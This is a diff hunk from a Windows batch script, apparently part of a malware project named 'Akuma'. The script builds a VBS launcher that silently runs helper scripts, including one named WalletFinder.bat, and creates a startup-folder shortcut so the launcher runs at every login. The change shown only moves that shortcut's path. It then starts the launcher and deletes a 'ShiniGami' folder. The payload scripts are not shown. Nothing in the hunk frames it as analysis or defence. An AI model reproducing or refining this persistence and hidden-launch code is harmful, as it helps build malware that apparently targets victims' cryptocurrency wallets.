@@ -29,7 +29,7 @@ echo objShell.Run "%userprofile%\Akuma\zonbi.bat", 0, False >> %userprofile%\Aku
 echo objShell.Run "%userprofile%\Akuma\network.bat", 0, False >> %userprofile%\Akuma\Akuma.vbs
 echo objShell.Run "%userprofile%\Akuma\WalletFinder.bat", 0, False >> %userprofile%\Akuma\Akuma.vbs
 echo y| del "%userprofile%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Akuma.lnk"
-powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Akuma.lnk');$s.TargetPath='%userprofile%\Akuma\Akuma.vbs';$s.Save()"
+powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%AppData%\Start Menu\Programs\Startup\Akuma.lnk');$s.TargetPath='%userprofile%\Akuma\Akuma.vbs';$s.Save()"
 start %userprofile%\Akuma\Akuma.vbs
 rmdir /s /q %userprofile%\ShiniGami
 exit
